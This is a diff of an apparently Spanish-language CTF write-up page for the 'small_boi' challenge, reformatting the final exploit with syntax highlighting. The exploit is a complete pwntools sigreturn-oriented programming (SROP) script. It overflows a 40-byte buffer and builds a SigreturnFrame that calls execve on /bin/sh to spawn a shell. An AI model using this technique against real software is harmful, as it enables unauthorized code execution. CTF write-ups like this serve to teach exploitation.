@@ -3,7 +3,7 @@
     <meta charset='utf-8'>
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <link rel="stylesheet" href="/assets/css/style.css?v=17941d18d5e8b6597efd5746996c8d7c1374c9d2">
+    <link rel="stylesheet" href="/assets/css/style.css?v=ad89651c35ce1f15ad2e2c36e337606f693f0ac8">
     <script src="https://kit.fontawesome.com/cad5e6b3e1.js" crossorigin="anonymous"></script>
 
 <!-- Begin Jekyll SEO tag v2.7.1 -->
@@ -208,41 +208,41 @@
 <p>Aca les dejo el exploit final:</p>
 <!-- /wp:paragraph -->
 
-<!-- wp:code -->
-<pre class="wp-block-code"><code>from pwn import *
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 
-# info del binario
-context.binary = './small_boi'
-context.arch = 'amd64'
-context.terminal = ['tmux', 'splitw', '-h']
-#funcion para correr el binario
-def start():
-    if args.GDB:
-        return gdb.debug('./small_boi')
+<span class="c1"># info del binario
+</span><span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="s">'./small_boi'</span>
+<span class="n">context</span><span class="p">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'amd64'</span>
+<span class="n">context</span><span class="p">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s">'tmux'</span><span class="p">,</span> <span class="s">'splitw'</span><span class="p">,</span> <span class="s">'-h'</span><span class="p">]</span>
+<span class="c1">#funcion para correr el binario
+</span><span class="k">def</span> <span class="nf">start</span><span class="p">():</span>
+    <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">GDB</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">gdb</span><span class="p">.</span><span class="n">debug</span><span class="p">(</span><span class="s">'./small_boi'</span><span class="p">)</span>
 
-    else:
-        return process('./small_boi')
+    <span class="k">else</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">process</span><span class="p">(</span><span class="s">'./small_boi'</span><span class="p">)</span>
 
-sigret = p64(0x40017c) #sig return address
+<span class="n">sigret</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x40017c</span><span class="p">)</span> <span class="c1">#sig return address
+</span>
+<span class="n">frame</span> <span class="o">=</span> <span class="n">SigreturnFrame</span><span class="p">()</span> <span class="c1">#sigreturnframe funcion de pwntools para crear el frame
+</span><span class="n">frame</span><span class="p">.</span><span class="n">rip</span> <span class="o">=</span> <span class="mh">0x400185</span> <span class="c1">#syscall, no empaquetamso ya que el frame poondra el valor directo en el registro
+</span><span class="n">frame</span><span class="p">.</span><span class="n">rax</span> <span class="o">=</span> <span class="mh">0x3b</span> <span class="c1">#0x3b es el numero de syscall de execve()
+</span><span class="n">frame</span><span class="p">.</span><span class="n">rdi</span> <span class="o">=</span> <span class="mh">0x4001ca</span> <span class="c1">#direccion de /bin/sh no ocupamos empaquetado por los mismo que el rip
+</span><span class="n">frame</span><span class="p">.</span><span class="n">rsi</span> <span class="o">=</span> <span class="mh">0x00</span> <span class="c1"># null 
+</span><span class="n">frame</span><span class="p">.</span><span class="n">rdx</span> <span class="o">=</span> <span class="mh">0x00</span> <span class="c1"># null
+</span>
 
-frame = SigreturnFrame() #sigreturnframe funcion de pwntools para crear el frame
-frame.rip = 0x400185 #syscall, no empaquetamso ya que el frame poondra el valor directo en el registro
-frame.rax = 0x3b #0x3b es el numero de syscall de execve()
-frame.rdi = 0x4001ca #direccion de /bin/sh no ocupamos empaquetado por los mismo que el rip
-frame.rsi = 0x00 # null 
-frame.rdx = 0x00 # null
-
-
-payload = "A" * 40 #offset
-payload += sigret #direccion de sigretur
+<span class="n">payload</span> <span class="o">=</span> <span class="s">"A"</span> <span class="o">*</span> <span class="mi">40</span> <span class="c1">#offset
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">sigret</span> <span class="c1">#direccion de sigretur
 #nuevo frame, con shift de 8 por el cambio del stack
 #vi otros writeups y no se si esto le paso a todo el mundo, a mi me ocurrio con ubuntu 18.04
-payload += str(frame)[8:] 
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="nb">str</span><span class="p">(</span><span class="n">frame</span><span class="p">)[</span><span class="mi">8</span><span class="p">:]</span> 
 
-#interaccion con el binario
-r = start()
-r.sendline(payload)
-r.interactive()</code></pre>
+<span class="c1">#interaccion con el binario
+</span><span class="n">r</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>
+<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">r</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div></div>
 <!-- /wp:code -->
 
                 </section>
